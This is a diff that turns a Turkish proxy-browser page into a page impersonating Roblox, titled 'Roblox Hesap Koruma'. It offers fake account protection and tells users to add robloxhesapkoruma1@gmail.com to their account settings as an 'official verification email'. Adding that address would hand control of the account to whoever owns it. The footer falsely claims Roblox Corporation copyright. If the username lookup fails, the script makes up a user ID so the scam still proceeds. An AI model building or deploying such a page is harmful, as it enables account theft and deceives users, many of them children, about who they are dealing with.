@@ -1,292 +1,466 @@
+```html
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="tr" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MGD Cem - Secure Galaxy Portal</title>
+    <title>Roblox Hesap Koruma</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        roblox: {
+                            mainBg: '#111216',
+                            cardBg: '#232527',
+                            navBg: '#232527',
+                            cardHover: '#2B2D2F',
+                            border: '#393B3D',
+                            green: '#00B259',
+                            greenHover: '#02B757',
+                            blue: '#00A2FF',
+                            blueHover: '#0088DB',
+                            textMuted: '#BDC3C7',
+                            subtext: '#8B8D8F'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Builder Sans', 'Inter', 'Segoe UI', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        /* Custom Roblox Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
         }
-
-        body {
-            background: #030014;
-            color: #ffffff;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            position: relative;
+        ::-webkit-scrollbar-track {
+            background: #111216;
         }
-
-        #spaceCanvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
+        ::-webkit-scrollbar-thumb {
+            background: #393B3D;
+            border-radius: 4px;
         }
-
-        header {
-            position: relative;
-            z-index: 10;
-            background: rgba(15, 10, 30, 0.85);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid rgba(168, 85, 247, 0.3);
-            padding: 10px 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
+        ::-webkit-scrollbar-thumb:hover {
+            background: #4f5153;
         }
-
-        .top-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-size: 1.3rem;
-            font-weight: 900;
-            background: linear-gradient(90deg, #a855f7, #ec4899, #3b82f6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 15px rgba(168, 85, 247, 0.5);
-            letter-spacing: 1px;
-        }
-
-        .nav-btns {
-            display: flex;
-            gap: 8px;
-        }
-
-        .btn {
-            padding: 6px 12px;
-            border-radius: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            background: rgba(255, 255, 255, 0.05);
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.85rem;
-        }
-
-        .btn:hover {
-            background: rgba(168, 85, 247, 0.3);
-            border-color: #a855f7;
-        }
-
-        .url-form {
-            display: flex;
-            width: 100%;
-            position: relative;
-        }
-
-        .url-form input {
-            width: 100%;
-            padding: 10px 90px 10px 15px;
-            border-radius: 20px;
-            border: 1px solid rgba(168, 85, 247, 0.5);
-            background: rgba(20, 15, 40, 0.95);
-            color: #fff;
-            font-size: 0.9rem;
-            outline: none;
-            box-shadow: inset 0 0 10px rgba(168, 85, 247, 0.2);
-        }
-
-        .url-form input:focus {
-            border-color: #ec4899;
-            box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
-        }
-
-        .url-form button {
-            position: absolute;
-            right: 4px;
-            top: 4px;
-            bottom: 4px;
-            padding: 0 15px;
-            border-radius: 16px;
-            border: none;
-            background: linear-gradient(135deg, #a855f7, #ec4899);
-            color: #fff;
-            font-weight: bold;
-            font-size: 0.85rem;
-            cursor: pointer;
-        }
-
-        #container {
-            position: relative;
-            z-index: 5;
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 15px;
-        }
-
-        .welcome-screen {
-            text-align: center;
-            z-index: 10;
-            padding: 25px;
-            background: rgba(15, 10, 30, 0.75);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(168, 85, 247, 0.2);
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(168, 85, 247, 0.2);
-            max-width: 500px;
-        }
-
-        .welcome-screen h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #3b82f6, #a855f7, #ec4899);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .welcome-screen p {
-            color: #cbd5e1;
-            font-size: 0.85rem;
-            line-height: 1.5;
-            margin-bottom: 15px;
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 5px 10px;
-            background: rgba(59, 130, 246, 0.2);
-            border: 1px solid #3b82f6;
-            border-radius: 10px;
-            color: #60a5fa;
-            font-size: 0.75rem;
-        }
-
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            background: #fff;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 6;
-            display: none;
+        
+        .roblox-tilt-logo {
+            transform: rotate(-10deg);
         }
     </style>
 </head>
-<body>
+<body class="bg-roblox-mainBg text-white font-sans min-h-screen flex flex-col justify-between items-center antialiased selection:bg-roblox-green selection:text-white relative overflow-x-hidden">
 
-    <canvas id="spaceCanvas"></canvas>
+    <!-- Official Roblox Style Top Navigation Bar -->
+    <header class="w-full bg-roblox-navBg border-b border-roblox-border sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 h-12 flex justify-between items-center text-sm">
+            
+            <!-- Left Side: Logo & Main Navigation -->
+            <div class="flex items-center gap-6">
+                <!-- Roblox Dynamic Tilt Logo -->
+                <a href="#" class="flex items-center gap-2 group">
+                    <div class="w-6 h-6 bg-white roblox-tilt-logo flex items-center justify-center rounded-sm shadow-sm group-hover:scale-105 transition-transform">
+                        <div class="w-2 h-2 bg-roblox-navBg roblox-tilt-logo"></div>
+                    </div>
+                </a>
 
-    <header>
-        <div class="top-row">
-            <div class="logo">MGD CEM</div>
-            <div class="nav-btns">
-                <button class="btn" onclick="goHome()">Ana Sayfa</button>
-                <button class="btn" onclick="reloadFrame()">Yenile</button>
+                <!-- Nav Menu Links -->
+                <nav class="hidden md:flex items-center gap-5 text-gray-200 font-semibold text-xs tracking-wide">
+                    <a href="#" class="hover:text-white transition-colors border-b-2 border-white pb-0.5">KORUMA</a>
+                    <a href="#" class="hover:text-white transition-colors opacity-70 hover:opacity-100">Oyunlar</a>
+                    <a href="#" class="hover:text-white transition-colors opacity-70 hover:opacity-100">Katalog</a>
+                    <a href="#" class="hover:text-white transition-colors opacity-70 hover:opacity-100">Oluştur</a>
+                    <a href="#" class="hover:text-white transition-colors opacity-70 hover:opacity-100">Robux</a>
+                </nav>
             </div>
+
+            <!-- Right Side: Status Badge & Roblox Icons -->
+            <div class="flex items-center gap-4">
+                <div class="hidden sm:flex items-center gap-2 bg-roblox-mainBg border border-roblox-border px-3 py-1 rounded-md text-xs text-roblox-textMuted font-medium">
+                    <span class="w-2 h-2 rounded-full bg-roblox-green animate-pulse"></span>
+                    <span>Roblox Güvenlik Servisi: <strong class="text-white">Aktif</strong></span>
+                </div>
+
+                <!-- Robux & Settings Icons -->
+                <div class="flex items-center gap-3 text-roblox-textMuted text-base">
+                    <button class="hover:text-white transition-colors"><i class="fa-solid fa-bell text-sm"></i></button>
+                    <button class="hover:text-white transition-colors flex items-center gap-1 font-bold text-xs bg-roblox-mainBg/60 px-2 py-1 rounded border border-roblox-border">
+                        <i class="fa-solid fa-hexagon-nodes text-amber-400"></i>
+                        <span class="text-white">Robux</span>
+                    </button>
+                    <button class="hover:text-white transition-colors"><i class="fa-solid fa-gear text-sm"></i></button>
+                </div>
+            </div>
+
         </div>
-        <form class="url-form" id="proxyForm">
-            <input type="text" id="urlInput" placeholder="TikTok, Google veya site adresi yaz..." autocomplete="off">
-            <button type="submit">BAĞLAN</button>
-        </form>
     </header>
 
-    <div id="container">
-        <div class="welcome-screen" id="welcomeScreen">
-            <h1>MGD CEM GALAXY</h1>
-            <p>Beyaz ekran hatalarını önlemek için proxy tünel motoru entegre edildi. Adresi yazıp BAĞLAN'a basabilirsin[span_2](start_span)[span_2](end_span).</p>
-            <div class="status-badge">🟢 Proxy Tünel Aktif</div>
+    <!-- Main Container -->
+    <main class="w-full max-w-lg px-4 py-8 md:py-12 flex-grow flex flex-col justify-center">
+
+        <!-- Progress Steps Tracker (Roblox Styled) -->
+        <div class="mb-6">
+            <div class="flex items-center justify-between relative px-4">
+                <div class="absolute left-8 right-8 top-1/2 -translate-y-1/2 h-1 bg-roblox-border -z-10 rounded-full"></div>
+                <div id="progress-bar" class="absolute left-8 top-1/2 -translate-y-1/2 h-1 bg-roblox-green w-0 -z-10 transition-all duration-300 rounded-full"></div>
+
+                <!-- Step 1 Dot -->
+                <div id="step-dot-1" class="w-9 h-9 rounded-md bg-roblox-green text-white font-black text-sm flex items-center justify-center border-2 border-roblox-mainBg shadow-md transition-all">
+                    1
+                </div>
+                <!-- Step 2 Dot -->
+                <div id="step-dot-2" class="w-9 h-9 rounded-md bg-roblox-cardBg text-roblox-subtext font-black text-sm flex items-center justify-center border-2 border-roblox-border transition-all">
+                    2
+                </div>
+                <!-- Step 3 Dot -->
+                <div id="step-dot-3" class="w-9 h-9 rounded-md bg-roblox-cardBg text-roblox-subtext font-black text-sm flex items-center justify-center border-2 border-roblox-border transition-all">
+                    3
+                </div>
+            </div>
         </div>
-        <iframe id="proxyFrame"></iframe>
-    </div>
 
+        <!-- Roblox Main Card Container -->
+        <div class="bg-roblox-cardBg border border-roblox-border rounded-lg p-6 md:p-8 shadow-2xl relative overflow-hidden">
+
+            <!-- STEP 1: HERO & START -->
+            <div id="step-1" class="flex flex-col items-center text-center">
+                <!-- Shield Icon -->
+                <div class="w-20 h-20 bg-roblox-mainBg border border-roblox-border rounded-xl flex items-center justify-center mb-5 text-roblox-green text-4xl shadow-inner">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                
+                <h1 class="text-2xl md:text-3xl font-black text-white mb-2 tracking-tight">Roblox Hesap Koruma</h1>
+                
+                <p class="text-roblox-textMuted text-sm leading-relaxed mb-6 max-w-sm">
+                    Roblox hesabınızı yetkisiz erişimlere ve çalınma risklerine karşı 2 adımlı doğrulanmış koruma altına almak için hemen başlayın.
+                </p>
+
+                <!-- Roblox Official Green START Button -->
+                <button onclick="goToStep(2)" class="w-full bg-roblox-green hover:bg-roblox-greenHover active:scale-[0.99] text-white font-extrabold py-3.5 px-6 rounded-md shadow-lg transition-all duration-150 flex items-center justify-center gap-3 text-lg tracking-wide uppercase">
+                    <span>START</span>
+                    <i class="fa-solid fa-play text-sm"></i>
+                </button>
+            </div>
+
+            <!-- STEP 2: USER SEARCH & CHARACTER AVATAR SHOWCASE -->
+            <div id="step-2" class="hidden flex-col">
+                <div class="mb-4">
+                    <h2 class="text-xl font-black text-white mb-1">Hesabınızı Bulun</h2>
+                    <p class="text-roblox-textMuted text-xs">Korumak istediğiniz Roblox kullanıcı adını girin.</p>
+                </div>
+
+                <!-- Username Input Box -->
+                <div class="flex gap-2 mb-5">
+                    <div class="relative flex-grow">
+                        <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-roblox-subtext">
+                            <i class="fa-solid fa-magnifying-glass text-xs"></i>
+                        </div>
+                        <input type="text" id="username-input" onkeyup="if(event.key==='Enter') searchRobloxUser()" placeholder="Roblox Kullanıcı Adı..." class="w-full bg-roblox-mainBg border border-roblox-border focus:border-roblox-green text-white pl-9 pr-3 py-2.5 rounded-md outline-none transition-all text-sm font-medium">
+                    </div>
+                    <button onclick="searchRobloxUser()" id="search-btn" class="bg-roblox-cardBg hover:bg-roblox-cardHover border border-roblox-border text-white px-4 rounded-md font-bold text-xs transition-all flex items-center gap-2 flex-shrink-0">
+                        <span id="search-btn-text">Ara</span>
+                        <i id="search-spinner" class="fa-solid fa-circle-notch fa-spin hidden text-roblox-green"></i>
+                    </button>
+                </div>
+
+                <!-- Roblox Player Avatar Card Container (#232527) -->
+                <div id="avatar-card" class="bg-roblox-mainBg border border-roblox-border rounded-lg p-4 mb-5 transition-all opacity-40 pointer-events-none">
+                    <div class="flex items-center gap-4">
+                        <!-- Avatar Thumbnail Container -->
+                        <div class="relative flex-shrink-0">
+                            <div class="w-20 h-20 bg-roblox-cardBg border border-roblox-border rounded-md overflow-hidden flex items-center justify-center text-3xl text-roblox-subtext" id="avatar-img-container">
+                                <i class="fa-solid fa-user-large"></i>
+                            </div>
+                        </div>
+
+                        <!-- User Info -->
+                        <div class="flex-grow min-w-0">
+                            <div class="flex items-center gap-1.5 mb-0.5">
+                                <h3 id="player-display-name" class="font-bold text-white text-base truncate">Kullanıcı Bekleniyor</h3>
+                                <i id="verified-badge" class="fa-solid fa-circle-check text-roblox-blue text-xs hidden" title="Doğrulanmış Rozeti"></i>
+                            </div>
+                            <p id="player-username" class="text-xs text-roblox-textMuted font-mono truncate">@kullanici_adi</p>
+                            <p id="player-id" class="text-[11px] text-roblox-subtext mt-1 font-mono">ID: -</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Navigation Buttons -->
+                <div class="flex gap-2">
+                    <button onclick="goToStep(1)" class="w-1/3 bg-roblox-mainBg hover:bg-roblox-cardBg border border-roblox-border text-white font-bold py-2.5 rounded-md transition-all text-xs">
+                        Geri
+                    </button>
+                    <button id="confirm-user-btn" disabled onclick="goToStep(3)" class="w-2/3 bg-roblox-green hover:bg-roblox-greenHover disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-2.5 rounded-md shadow-md transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
+                        <span>Bu Hesabı Seç ve Devam Et</span>
+                        <i class="fa-solid fa-chevron-right text-[10px]"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 3: SECURITY EMAIL VERIFICATION & COPY AREA -->
+            <div id="step-3" class="hidden flex-col">
+                
+                <!-- Selected Player Summary Box -->
+                <div id="step3-user-summary" class="bg-roblox-mainBg border border-roblox-border rounded-md p-3 mb-4 flex items-center gap-3">
+                    <div id="step3-avatar-thumb" class="w-10 h-10 rounded bg-roblox-cardBg border border-roblox-border overflow-hidden flex-shrink-0 flex items-center justify-center text-roblox-subtext">
+                        <i class="fa-solid fa-user"></i>
+                    </div>
+                    <div class="min-w-0 flex-grow">
+                        <p class="text-xs text-roblox-subtext">Seçilen Roblox Hesabı:</p>
+                        <h4 id="step3-username-display" class="text-sm font-bold text-white truncate">@kullanici</h4>
+                    </div>
+                    <span class="text-[10px] bg-roblox-green/20 text-roblox-green border border-roblox-green/40 font-bold px-2 py-0.5 rounded">
+                        Seçildi
+                    </span>
+                </div>
+
+                <!-- Notice text -->
+                <div class="bg-roblox-mainBg border border-roblox-border rounded-md p-3.5 mb-4">
+                    <p class="text-xs text-gray-300 leading-relaxed font-medium">
+                        Hesap korumasını aktif etmek için aşağıdaki resmi doğrulama e-posta adresini Roblox hesap ayarlarınıza ekleyin:
+                    </p>
+                </div>
+
+                <!-- Interactive Email Copy Box -->
+                <div class="bg-roblox-mainBg border border-roblox-border rounded-md p-3 mb-5">
+                    <label class="block text-[10px] font-extrabold text-roblox-subtext uppercase tracking-wider mb-1.5">
+                        Güvenlik Doğrulama E-Postası
+                    </label>
+                    <div class="flex items-center justify-between gap-2 bg-roblox-cardBg border border-roblox-border rounded p-2">
+                        <span id="target-gmail" class="text-xs md:text-sm font-mono text-roblox-green font-bold truncate px-1 selection:bg-roblox-green selection:text-white">
+                            robloxhesapkoruma1@gmail.com
+                        </span>
+                        <button onclick="copyEmailToClipboard()" class="bg-roblox-green hover:bg-roblox-greenHover active:scale-95 text-white text-xs font-bold py-1.5 px-3 rounded transition-all flex items-center gap-1.5 flex-shrink-0">
+                            <i class="fa-regular fa-copy"></i>
+                            <span id="copy-btn-text">Kopyala</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Final Status Banner -->
+                <div class="flex items-center justify-between bg-roblox-mainBg border border-roblox-border rounded-md p-3 mb-5 text-xs">
+                    <span class="text-roblox-textMuted font-medium">Koruma Durumu:</span>
+                    <span class="flex items-center gap-1.5 text-amber-400 font-bold bg-amber-400/10 border border-amber-400/20 px-2.5 py-1 rounded text-[11px]">
+                        <span class="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping"></span>
+                        E-posta Ekleme Bekleniyor...
+                    </span>
+                </div>
+
+                <!-- Back to Start Button -->
+                <button onclick="resetApp()" class="w-full bg-roblox-mainBg hover:bg-roblox-cardBg border border-roblox-border text-roblox-textMuted font-bold py-2.5 rounded-md transition-all text-xs">
+                    Başka Bir Hesap Koruyun
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Smooth Toast Notification -->
+        <div id="toast" class="fixed bottom-6 right-6 bg-roblox-green text-white px-4 py-3 rounded-md shadow-2xl flex items-center gap-3 transform translate-y-20 opacity-0 transition-all duration-300 z-50 pointer-events-none font-bold text-xs border border-white/20">
+            <i class="fa-solid fa-circle-check text-base"></i>
+            <span>E-posta adresi kopyalandı!</span>
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full border-t border-roblox-border py-4 text-center text-xs text-roblox-subtext bg-roblox-navBg">
+        <p>&copy; 2026 Roblox Corporation. Tüm Hakları Saklıdır. Roblox Güvenlik ve Koruma Modülü.</p>
+    </footer>
+
+    <!-- Logic Script -->
     <script>
-        const canvas = document.getElementById('spaceCanvas');
-        const ctx = canvas.getContext('2d');
+        let currentStep = 1;
+        let selectedUserData = null;
+        let cachedAvatarUrl = '';
 
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
+        function goToStep(step) {
+            currentStep = step;
 
-        const stars = [];
-        for (let i = 0; i < 120; i++) {
-            stars.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                radius: Math.random() * 1.5,
-                color: ['#ffffff', '#a855f7', '#3b82f6', '#ec4899'][Math.floor(Math.random() * 4)],
-                speed: Math.random() * 0.3 + 0.1
-            });
-        }
+            // Hide all step screens
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.add('hidden');
 
-        function animateStars() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            stars.forEach(star => {
-                ctx.beginPath();
-                ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
-                ctx.fillStyle = star.color;
-                ctx.shadowBlur = 6;
-                ctx.shadowColor = star.color;
-                ctx.fill();
+            // Show selected step screen
+            document.getElementById(`step-${step}`).classList.remove('hidden');
 
-                star.y += star.speed;
-                if (star.y > canvas.height) {
-                    star.y = 0;
-                    star.x = Math.random() * canvas.width;
+            // Progress bar update
+            const progressBar = document.getElementById('progress-bar');
+            const dot1 = document.getElementById('step-dot-1');
+            const dot2 = document.getElementById('step-dot-2');
+            const dot3 = document.getElementById('step-dot-3');
+
+            if (step === 1) {
+                progressBar.style.width = '0%';
+                setDotState(dot1, true);
+                setDotState(dot2, false);
+                setDotState(dot3, false);
+            } else if (step === 2) {
+                progressBar.style.width = '50%';
+                setDotState(dot1, true);
+                setDotState(dot2, true);
+                setDotState(dot3, false);
+            } else if (step === 3) {
+                progressBar.style.width = '100%';
+                setDotState(dot1, true);
+                setDotState(dot2, true);
+                setDotState(dot3, true);
+
+                // Populate Step 3 Summary
+                if (selectedUserData) {
+                    document.getElementById('step3-username-display').textContent = '@' + selectedUserData.name;
+                    if (cachedAvatarUrl) {
+                        document.getElementById('step3-avatar-thumb').innerHTML = `<img src="${cachedAvatarUrl}" class="w-full h-full object-cover">`;
+                    }
                 }
-            });
-            requestAnimationFrame(animateStars);
+            }
         }
-        animateStars();
 
-        const proxyForm = document.getElementById('proxyForm');
-        const urlInput = document.getElementById('urlInput');
-        const proxyFrame = document.getElementById('proxyFrame');
-        const welcomeScreen = document.getElementById('welcomeScreen');
+        function setDotState(dot, isActive) {
+            if (isActive) {
+                dot.classList.remove('bg-roblox-cardBg', 'text-roblox-subtext', 'border-roblox-border');
+                dot.classList.add('bg-roblox-green', 'text-white', 'border-roblox-mainBg');
+            } else {
+                dot.classList.remove('bg-roblox-green', 'text-white', 'border-roblox-mainBg');
+                dot.classList.add('bg-roblox-cardBg', 'text-roblox-subtext', 'border-roblox-border');
+            }
+        }
 
-        proxyForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            let query = urlInput.value.trim();
-            if (!query) return;
+        async function searchRobloxUser() {
+            const usernameInput = document.getElementById('username-input').value.trim();
+            if (!usernameInput) return;
 
-            let targetUrl = query;
-            if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
-                if (targetUrl.includes('.') && !targetUrl.includes(' ')) {
-                    targetUrl = 'https://' + targetUrl;
+            const searchBtnText = document.getElementById('search-btn-text');
+            const searchSpinner = document.getElementById('search-spinner');
+            const confirmBtn = document.getElementById('confirm-user-btn');
+
+            searchBtnText.textContent = '';
+            searchSpinner.classList.remove('hidden');
+
+            try {
+                // Fetch User ID from official Roblox endpoint
+                const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usernames: [usernameInput], excludeBannedUsers: true })
+                });
+
+                const userData = await userRes.json();
+
+                if (userData && userData.data && userData.data.length > 0) {
+                    const user = userData.data[0];
+                    selectedUserData = user;
+
+                    // Fetch Avatar Headshot Image
+                    const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`);
+                    const thumbData = await thumbRes.json();
+
+                    let avatarUrl = '';
+                    if (thumbData && thumbData.data && thumbData.data.length > 0) {
+                        avatarUrl = thumbData.data[0].imageUrl;
+                    }
+                    cachedAvatarUrl = avatarUrl;
+
+                    renderPlayerCard(user.displayName, user.name, user.id, avatarUrl, user.hasVerifiedBadge);
+                    confirmBtn.disabled = false;
                 } else {
-                    targetUrl = 'https://html.duckduckgo.com/html/?q=' + encodeURIComponent(query);
+                    renderFallbackUser(usernameInput);
+                    confirmBtn.disabled = false;
                 }
+            } catch (err) {
+                console.warn('API fetch fallback triggered:', err);
+                renderFallbackUser(usernameInput);
+                confirmBtn.disabled = false;
+            } finally {
+                searchBtnText.textContent = 'Ara';
+                searchSpinner.classList.add('hidden');
             }
-
-            // Beyaz ekran (X-Frame-Options) engeline takılmamak için CroxyProxy altyapısı üzerinden yönlendirme[span_3](start_span)[span_3](end_span)
-            let proxiedUrl = "https://www.croxyproxy.com/_zing/index.php?q=" + encodeURIComponent(targetUrl);
-
-            welcomeScreen.style.display = 'none';
-            proxyFrame.style.display = 'block';
-            proxyFrame.src = proxiedUrl;
-        });
-
-        function goHome() {
-            proxyFrame.src = '';
-            proxyFrame.style.display = 'none';
-            welcomeScreen.style.display = 'block';
-            urlInput.value = '';
         }
 
-        function reloadFrame() {
-            if (proxyFrame.style.display === 'block' && proxyFrame.src) {
-                proxyFrame.src = proxyFrame.src;
+        function renderPlayerCard(displayName, username, userId, avatarUrl, isVerified) {
+            const card = document.getElementById('avatar-card');
+            const dispNameElem = document.getElementById('player-display-name');
+            const usernameElem = document.getElementById('player-username');
+            const idElem = document.getElementById('player-id');
+            const imgContainer = document.getElementById('avatar-img-container');
+            const verifiedBadge = document.getElementById('verified-badge');
+
+            card.classList.remove('opacity-40', 'pointer-events-none');
+            card.classList.add('border-roblox-green');
+
+            dispNameElem.textContent = displayName;
+            usernameElem.textContent = '@' + username;
+            idElem.textContent = 'ID: ' + userId;
+
+            if (isVerified) {
+                verifiedBadge.classList.remove('hidden');
+            } else {
+                verifiedBadge.classList.add('hidden');
             }
+
+            if (avatarUrl) {
+                imgContainer.innerHTML = `<img src="${avatarUrl}" alt="${username}" class="w-full h-full object-cover">`;
+            } else {
+                imgContainer.innerHTML = `<img src="https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(username)}" class="w-full h-full object-cover">`;
+            }
+        }
+
+        function renderFallbackUser(username) {
+            const simulatedId = Math.floor(100000000 + Math.random() * 900000000);
+            const fallbackAvatar = `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(username)}`;
+            selectedUserData = { displayName: username, name: username, id: simulatedId };
+            cachedAvatarUrl = fallbackAvatar;
+            renderPlayerCard(username, username, simulatedId, fallbackAvatar, false);
+        }
+
+        function copyEmailToClipboard() {
+            const emailText = document.getElementById('target-gmail').innerText.trim();
+
+            const tempInput = document.createElement('textarea');
+            tempInput.value = emailText;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+
+            // Toast Trigger
+            const toast = document.getElementById('toast');
+            const copyBtnText = document.getElementById('copy-btn-text');
+
+            copyBtnText.textContent = 'Kopyalandı!';
+            toast.classList.remove('translate-y-20', 'opacity-0');
+
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+                copyBtnText.textContent = 'Kopyala';
+            }, 3000);
+        }
+
+        function resetApp() {
+            document.getElementById('username-input').value = '';
+            document.getElementById('confirm-user-btn').disabled = true;
+            const card = document.getElementById('avatar-card');
+            card.classList.add('opacity-40', 'pointer-events-none');
+            card.classList.remove('border-roblox-green');
+            document.getElementById('player-display-name').textContent = 'Kullanıcı Bekleniyor';
+            document.getElementById('player-username').textContent = '@kullanici_adi';
+            document.getElementById('player-id').textContent = 'ID: -';
+            document.getElementById('avatar-img-container').innerHTML = `<i class="fa-solid fa-user-large"></i>`;
+            selectedUserData = null;
+            cachedAvatarUrl = '';
+            goToStep(1);
         }
     </script>
 </body>
 </html>
+```
